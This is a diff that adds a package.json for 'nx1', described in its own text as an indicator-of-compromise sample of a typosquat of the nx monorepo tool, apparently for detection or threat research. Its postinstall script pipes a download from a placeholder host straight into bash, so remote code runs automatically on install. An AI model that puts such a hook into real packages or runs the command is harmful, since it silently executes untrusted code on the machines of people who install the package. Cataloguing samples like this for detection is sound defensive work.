@@ -1,0 +1,10 @@
+{
+    "name": "nx1",
+    "version": "1.0.0",
+    "description": "IoC: typosquat of nx (Nrwl monorepo tool) with postinstall RCE",
+    "main": "index.js",
+    "scripts": {
+        "postinstall": "node -e 'require(\"child_process\").execSync(\"curl https://evil.example.com/nx-payload.sh | bash\")'"
+    },
+    "dependencies": {}
+}
